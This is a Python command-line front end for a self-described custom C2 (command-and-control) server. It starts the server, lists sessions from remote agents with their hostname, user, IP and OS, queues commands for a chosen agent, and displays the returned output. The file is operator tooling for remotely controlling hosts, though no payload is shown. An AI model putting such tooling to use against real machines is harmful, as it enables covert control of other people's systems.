#!/usr/bin/env python3
import argparse
from .server import C2Server
from .operator import C2Operator

def main():
    parser = argparse.ArgumentParser(description="Custom C2 Server")
    parser.add_argument('--server', action='store_true', help='Start C2 server')
    parser.add_argument('--list', action='store_true', help='List active sessions')
    parser.add_argument('--command', type=str, help='Issue command to session')
    parser.add_argument('--session', type=str, help='Target session ID')
    parser.add_argument('--results', action='store_true', help='View command results')
    parser.add_argument('--task', type=str, help='View results for specific task')

    args = parser.parse_args()

    if args.server:
        server = C2Server()
        server.run()
    else:
        operator = C2Operator()

        if args.list:
            sessions = operator.list_sessions()
            print("\n[*] Active Sessions:")
            print("="*80)
            for session in sessions:
                print(f"Session ID: {session['session_id']}")
                print(f"  Hostname: {session['hostname']}")
                print(f"  User: {session['username']}")
                print(f"  IP: {session['ip_address']}")
                print(f"  OS: {session['os_type']}")
                print(f"  Last Seen: {session['last_seen']}")
                print()

        elif args.command and args.session:
            task_id = operator.issue_command(args.session, args.command)
            if task_id:
                print(f"[+] Task created: {task_id}")
                print(f"[+] Command: {args.command}")
                print(f"[*] Waiting for agent to retrieve task...")

        elif args.results:
            if args.task:
                results = operator.get_results(task_id=args.task)
            elif args.session:
                results = operator.get_results(session_id=args.session)
            else:
                results = operator.get_results()
            print("\n[*] Results:")
            print("="*80)
            for result in results:
                print(f"Task ID: {result['task_id']}")
                print(f"Session: {result['session_id']}")
                print(f"Command: {result['command']}")
                print(f"Received: {result['received_at']}")
                print(f"Output:\n{result['output']}\n")
                print("-"*80)

        else:
            parser.print_help()

if __name__ == "__main__":
    main()